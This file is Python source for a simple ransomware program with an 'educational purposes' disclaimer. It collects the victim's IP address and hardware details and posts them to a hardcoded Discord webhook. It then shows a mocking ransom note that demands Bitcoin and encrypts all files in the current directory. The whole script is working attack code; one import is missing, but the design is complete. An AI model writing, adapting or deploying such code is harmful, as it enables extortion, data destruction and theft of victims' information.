#!usr/bin/env python3

######################################################
# Copy Right to ~> Security On PePs & Team           #
# Follow Me on Github ~> https://github.com/ajdev05/ #
# Discord ~> https://discord.gg/KBSQyjWVzG           #
# *Only for testing and educational Purposes*        #
######################################################


import os
from cryptography.fernet import Fernet
import time
import requests
from requests import get
import datetime
os.system("clear")
files=[]

for file in os.listdir():
    if file == 'en.py'or file == "enkey.key" or file == "dc.py" or file == "decrypt.txt": ### Main Files that are Going to be created change them if you like.
        continue
    if os.path.isfile(file):
            files.append(file)

### If Ransome is ran it sends an alert to Discord server to Webhook API

## Hardware info

oss=('Operating System : ', platform.system())
hs=('Hostname : ', platform.node())
ms=("Machine : ", platform.machine())
pro=("Processor : ", platform.processor())
rel=("Release : ", platform.release())
vr=("Version : ", platform.version())

### If Ransome is ran it sends an alert to Discord server to Webhook API

ip=get("https://api.ipify.org").text
dt = datetime.datetime.now()
nowt=dt.strftime("%Y-%m-%d %H:%M:%S")

url = "https://discord.com/api/webhooks/975945287594024990/1Tdz8Hk8ymc5oqzQNUdqHSza5NWwDjWeKPMy8IqxRQ6pCeXdu9yojSJNBNfgl9e4_8R3"
x = f"""**```
Ransom ran on a Computer! 
--------------------------
Target IP Address ~> {ip} 
---------------------------------
Time ~> {nowt}
---------------------
Hardware Information:

{oss}
{hs}
{ms}
{pro}
{rel}
{vr}```**"""

r=requests.post(url, data={"content": x})

btc_addr="" ### Enter your BITCOIN ADDRESS in the Quotes
ur_email="" ### Enter your Email
### Beginning encryption 
print(f"""
 
         __          __              _             _ 
         \ \        / /             (_)           | |
          \ \  /\  / /_ _ _ __ _ __  _ _ __   __ _| |
           \ \/  \/ / _` | '__| '_ \| | '_ \ / _` | |
            \  /\  / (_| | |  | | | | | | | | (_| |_|
             \/  \/ \__,_|_|  |_| |_|_|_| |_|\__, (_)
                                              __/ |  
                                             |___/   
             ___________________________________
            [You're Computer has been fucked lol]                                           
            [Your files are Encrypted hahaha cry]              
            [So, if you feel like getting your  ]
            [files back send me [0.0030 BITCOIN]]
             ----------------------------------- 
          Send Bitcoin to my address [ {btc_addr} ] 
             ---------------------------------
      After you sent the Bitcoin send an Eamil to [ {ur_email} ] 
             
             
             """)

wr=("") ### Write Your text here or set of instrustion that the target has to follow
with open("decrypt.txt", "w+") as f:
    f.write(wr)


key=Fernet.generate_key()

with open("enkey.key", "wb") as enkey:
    enkey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        cont=thefile.read()
    cont_en = Fernet(key).encrypt(cont)
    with open(file,"wb") as thefile:
        thefile.write(cont_en)
        
input("If you are done reading press ENTER to exit\n")
exit()
